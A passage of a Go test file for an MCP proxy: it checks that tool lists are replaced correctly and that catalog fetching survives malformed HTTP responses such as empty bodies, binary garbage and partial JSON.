		if tool.Name == "tool_a" || tool.Name == "tool_b" {
			t.Errorf("old tool %q still present after SetTools replacement", tool.Name)
		}
	}

	// New tools should be present
	foundX := false
	foundVersion := false
	for _, tool := range updatedTools {
		if tool.Name == "tool_x" {
			foundX = true
		}
		if tool.Name == "get_version" {
			foundVersion = true
		}
	}
	if !foundX {
		t.Error("tool_x missing after SetTools")
	}
	if !foundVersion {
		t.Error("get_version missing after SetTools")
	}
}

// =============================================================================
// 14. FetchCatalog response body checks
// =============================================================================

// TestFetchCatalog_StressMalformedResponses ensures FetchCatalog handles all
// manner of garbage responses without panicking.
func TestFetchCatalog_StressMalformedResponses(t *testing.T) {
	responses := []struct {
		name   string
		body   string
		status int
	}{
		{"empty_body", "", 200},
		{"null", "null", 200},
		{"single_object", `{"name":"tool"}`, 200},
		{"nested_array", `[[{"name":"tool"}]]`, 200},
		{"binary_garbage", "\xff\xfe\xfd\x00\x01", 200},
		{"partial_json", `[{"name":"tool"`, 200},
		{"html_error", `<html>502 Bad Gateway</html>`, 502},
		{"zero_byte", "\x00", 200},
	}

	for _, tc := range responses {
		t.Run(tc.name, func(t *testing.T) {
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(tc.status)
				w.Write([]byte(tc.body))
			}))
			defer srv.Close()

			p := NewMCPProxy(srv.URL, testLogger(), testConfig())

			// Must not panic
			catalog, err := p.FetchCatalog(context.Background())
			t.Logf("response=%q -> catalog=%d, err=%v", tc.name, len(catalog), err)
		})
	}
}
